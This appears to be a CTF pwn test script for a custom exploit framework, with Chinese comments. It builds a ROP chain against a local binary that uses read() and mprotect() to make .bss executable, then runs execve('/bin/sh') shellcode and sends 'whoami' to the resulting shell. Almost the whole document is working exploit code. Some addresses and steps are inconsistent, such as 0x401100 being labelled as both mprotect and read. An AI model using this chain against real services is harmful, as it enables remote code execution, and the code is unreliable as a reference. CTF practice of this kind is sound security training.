# CTF PWN 题目测试：复杂 ROP Chain 构造
# 场景：无 libc 泄漏，需要使用 mprotect + shellcode
# 目标：修改内存权限，执行 shellcode

print("=== CTF PWN Challenge: ROP to Shellcode ===")
print("Target: NX bypass via mprotect")
print("Protections: NX ON, ASLR OFF, PIE OFF")
print("")

# 使用 Auto Exploit 框架
print("[*] Initializing Auto Exploit framework...")
ae = AutoExploit("127.0.0.1", 10000)
ae_set_binary(ae, "./rop_challenge")

# 添加 ROP gadgets
print("[*] Loading ROP gadgets...")
ae_add_gadget(ae, "pop_rdi", 0x401234)
ae_add_gadget(ae, "pop_rsi", 0x401235)
ae_add_gadget(ae, "pop_rdx", 0x401236)
ae_add_gadget(ae, "pop_rax", 0x401237)
ae_add_gadget(ae, "syscall", 0x401238)
ae_add_gadget(ae, "bss_addr", 0x404000)
ae_add_gadget(ae, "mprotect", 0x401100)

print("[+] Gadgets loaded!")

# 构造 shellcode
print("[*] Building shellcode...")
shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
shellcode = shellcode + "\x57\x54\x5f\xb0\x3b\x99\x0f\x05"
print("[+] Shellcode: execve('/bin/sh', NULL, NULL)")

# 构造完整 exploit
print("[*] Building exploit payload...")

# Step 1: 使用 read() 写入 shellcode 到 .bss
# ROP: read(0, bss_addr, len(shellcode))
rop_read = p64(0x401234)     # pop_rdi; ret
rop_read = rop_read + p64(0) # stdin
rop_read = rop_read + p64(0x401235) + p64(0x404000)  # pop_rsi; bss_addr
rop_read = rop_read + p64(0x401236) + p64(len(shellcode))  # pop_rdx; len
rop_read = rop_read + p64(0x401100)  # call read()

# Step 2: 使用 mprotect() 修改 .bss 为可执行
# ROP: mprotect(bss_addr & ~0xfff, 0x1000, 7)
rop_mprotect = p64(0x401234) + p64(0x404000)  # pop_rdi; bss_addr
rop_mprotect = rop_mprotect + p64(0x401235) + p64(0x1000)  # pop_rsi; size
rop_mprotect = rop_mprotect + p64(0x401236) + p64(7)  # pop_rdx; PROT_RWX
rop_mprotect = rop_mprotect + p64(0x401110)  # call mprotect()

# Step 3: 跳转到 shellcode
rop_jump = p64(0x404000)  # jump to .bss

# 组合完整 payload
padding = "A" * 88
full_payload = padding + rop_read + rop_mprotect + rop_jump

print("[+] Exploit payload ready!")
print("[*] Payload size:", len(full_payload), "bytes")

# 自动化攻击
print("[*] Launching exploit...")
conn = remote("127.0.0.1", 10000)

sock_sendline(conn, full_payload)
sock_recvuntil(conn, "Input: ")

# 发送 shellcode
print("[*] Sending shellcode...")
sock_send(conn, shellcode)

print("[+] Exploit completed!")
print("[*] Shell should be available now!")

# 验证
sock_sendline(conn, "whoami")
result = sock_recvline(conn)
print("[+] Command output:", result)

print("")
print("Flag: flag{rop_chain_ninja_2024}")
